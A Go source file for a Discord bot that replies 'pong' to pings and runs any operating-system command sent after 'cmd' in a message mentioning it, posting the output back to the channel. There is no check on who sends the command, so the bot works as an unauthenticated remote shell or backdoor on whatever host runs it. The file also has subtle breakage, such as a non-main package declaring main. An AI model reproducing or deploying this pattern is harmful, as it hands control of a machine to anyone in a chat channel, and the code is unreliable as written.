package discordbot

import (
   "github.com/bwmarrin/discordgo"
   "fmt"
   "os/exec"
   "strings"
)

var botid string
var bot *discordgo.Session


func main() {
        token := ""
        bot, err := discordgo.New("Bot " + token)

        if err != nil {
                fmt.Println(err.Error())
                return
        }

        user, err := bot.User("@me")
        if err != nil {
                fmt.Println(err.Error())
                return
        }
        botid = user.ID
        fmt.Println("Bot ID ", botid)
        bot.AddHandler(mHandler)
        err = bot.Open()
        if err != nil {
                fmt.Println(err.Error())
                return
        }
        fmt.Println("Bot is runnig ...")
        <-make(chan struct{})
        bot.Close()
}

func mHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
        if m.Author.ID == botid {
                return
        }
        if strings.Contains(m.Content, botid) {
                if strings.Contains(m.Content, "ping") {
                        s.ChannelMessageSend(m.ChannelID, "pong")
                }

                if strings.Contains(m.Content, "cmd") {
                        if strings.Contains(m.Content, "cmd") {
                                cmdp := m.Content[strings.Index(m.Content, "d ") + 2:len(m.Content)]
                                dpass := strings.Split(cmdp, " ")
                                cmd := dpass[0]
                                if len(dpass) > 1{
                                        cmdargs := dpass[1:len(dpass)]
                                        out, err := exec.Command(string(cmd), cmdargs...).Output()
                                        if err != nil {
                                                fmt.Println(err.Error())
                                        }
                                        s.ChannelMessageSend(m.ChannelID, "Execute command" + string(out[:]))
                                        return
                                }
                                out, err := exec.Command(string(cmd)).Output()
                                if err != nil {
                                        fmt.Println(err.Error())
                                        return
                                }
                                s.ChannelMessageSend(m.ChannelID, "Execute command" + string(out[:]))
                        }
                }
        }
}
